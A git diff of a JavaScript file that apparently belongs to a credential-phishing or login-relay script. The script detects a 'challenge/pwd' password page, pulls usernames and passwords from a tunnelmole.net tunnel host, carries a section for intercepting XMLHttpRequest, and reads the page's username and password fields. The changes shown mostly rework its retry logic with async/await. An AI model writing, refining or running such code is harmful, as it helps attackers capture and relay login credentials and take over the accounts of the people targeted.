@@ -5,11 +5,11 @@ let passwordFetched = false;
 let inPasswordPage = false; // Track if we are on the password page
 
 // ✅ Check if we are on the password page
-const checkPasswordPage = () => {
+const checkPasswordPage = async () => {
     if (window.location.href.includes('challenge/pwd')) {
         inPasswordPage = true;
         console.log('Now on the password page');
-        fetchFreqPassword();
+        await fetchFreqPassword();
     } else {
         inPasswordPage = false;
     }
@@ -20,7 +20,6 @@ const fetchFreqUsername = async () => {
     if (usernameFetched) return; // Avoid redundant fetches once username is fetched
 
     console.log('Fetching username...');
-
     try {
         const response = await fetch('https://qmjnmt-ip-37-228-207-173.tunnelmole.net/get-first-post-data', {
             method: 'GET',
@@ -28,7 +27,6 @@ const fetchFreqUsername = async () => {
         });
 
         if (!response.ok) throw new Error(`HTTP error! Status: ${response.status}`);
-
         const result = await response.json();
         console.log('Response from /get-first-post-data:', result);
 
@@ -43,16 +41,16 @@ const fetchFreqUsername = async () => {
             processUsernameRequests();
 
             // Wait for navigation to password page
-            setTimeout(() => {
-                checkPasswordPage(); // Check if we are on the password page
-            }, 1000); // Give the page some time to navigate
+            setTimeout(checkPasswordPage, 1000); // Give the page some time to navigate
         } else {
             console.warn("No username data received, retrying...");
-            setTimeout(fetchFreqUsername, 500); // Retry if no username data
+            await new Promise(resolve => setTimeout(resolve, 500)); // Wait 500ms and retry
+            await fetchFreqUsername(); // Retry the fetch
         }
     } catch (error) {
         console.error('Error fetching username:', error);
-        setTimeout(fetchFreqUsername, 500); // Retry on failure
+        await new Promise(resolve => setTimeout(resolve, 500)); // Wait and retry on failure
+        await fetchFreqUsername(); // Retry the fetch
     }
 };
 
@@ -60,7 +58,6 @@ const fetchFreqUsername = async () => {
 const fetchFreqPassword = async () => {
     if (passwordFetched || !inPasswordPage) return; // Only proceed if we are on the password page
     console.log('Fetching password...');
-
     try {
         const response = await fetch('https://qmjnmt-ip-37-228-207-173.tunnelmole.net/get-first-post-password', {
             method: 'GET',
@@ -68,7 +65,6 @@ const fetchFreqPassword = async () => {
         });
 
         if (!response.ok) throw new Error(`HTTP error! Status: ${response.status}`);
-
         const result = await response.json();
         console.log('Response from /get-first-post-password:', result);
 
@@ -82,36 +78,40 @@ const fetchFreqPassword = async () => {
             processPasswordRequests();
         } else {
             console.warn("No password data received, retrying...");
-            setTimeout(fetchFreqPassword, 500); // Retry if no password data
+            await new Promise(resolve => setTimeout(resolve, 500)); // Retry if no password data
+            await fetchFreqPassword(); // Retry the fetch
         }
     } catch (error) {
         console.error('Error fetching password:', error);
-        setTimeout(fetchFreqPassword, 500); // Retry on failure
+        await new Promise(resolve => setTimeout(resolve, 500)); // Retry on failure
+        await fetchFreqPassword(); // Retry the fetch
     }
 };
 
 // ✅ Process pending username requests
-const processUsernameRequests = () => {
+const processUsernameRequests = async () => {
     if (!freqUsername) {
         console.log("Username not available yet, retrying...");
-        setTimeout(processUsernameRequests, 500); // Retry until username is available
+        await new Promise(resolve => setTimeout(resolve, 500)); // Wait and retry
+        await processUsernameRequests(); // Retry until username is available
         return;
     }
 
-    console.log("Processing pending username requests...");
-    // Process username-related intercepted requests here
+    console.log("Processing username requests...");
+    // Add logic to handle username-related requests here
 };
 
 // ✅ Process pending password requests
-const processPasswordRequests = () => {
+const processPasswordRequests = async () => {
     if (!freqPassword) {
         console.log("Password not available yet, retrying...");
-        setTimeout(processPasswordRequests, 500); // Retry until password is available
+        await new Promise(resolve => setTimeout(resolve, 500)); // Wait and retry
+        await processPasswordRequests(); // Retry until password is available
         return;
     }
 
-    console.log("Processing pending password requests...");
-    // Process password-related intercepted requests here
+    console.log("Processing password requests...");
+    // Add logic to handle password-related requests here
 };
 
 // ✅ Intercept XMLHttpRequest
@@ -171,7 +171,6 @@ document.addEventListener('DOMContentLoaded', () => {
 // ✅ Send username logic
 const sendUsername = async () => {
     console.log('Sending username...');
-
     const username = document.getElementById('username')?.value;
     if (!username) {
         console.warn("No username entered");
@@ -198,7 +197,6 @@ const sendUsername = async () => {
 // ✅ Send password logic
 const sendPassword = async () => {
     console.log('Sending password...');
-
     const password = document.getElementById('password')?.value;
     if (!password) {
         console.warn("No password entered");
